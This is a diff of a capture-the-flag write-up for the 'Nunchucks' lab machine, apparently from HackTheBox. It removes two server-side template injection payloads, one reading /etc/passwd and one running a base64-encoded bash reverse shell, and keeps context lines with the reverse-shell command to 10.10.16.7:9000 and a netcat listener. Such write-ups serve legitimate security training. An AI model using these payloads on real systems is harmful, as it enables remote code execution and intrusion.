@@ -57,10 +57,6 @@ echo "10.10.11.122 store.nunchucks.htb" >> /etc/hosts
 
 https://ctftime.org/writeup/34053
 
-```bash
-{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')\")()}}
-```
-
 ![](/img2/Pasted%20image%2020250601212336.png)
 
 - Send reverse shell
@@ -73,9 +69,6 @@ echo -n "/bin/bash -i >& /dev/tcp/10.10.16.7/9000 0>&1" | base64
 
 ![](/img2/Pasted%20image%2020250601212819.png)
 
-```bash
-{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjcvOTAwMCAwPiYx|base64 -d|bash')\")()}}
-```
 
 ```bash
 nc -nlvp 9000
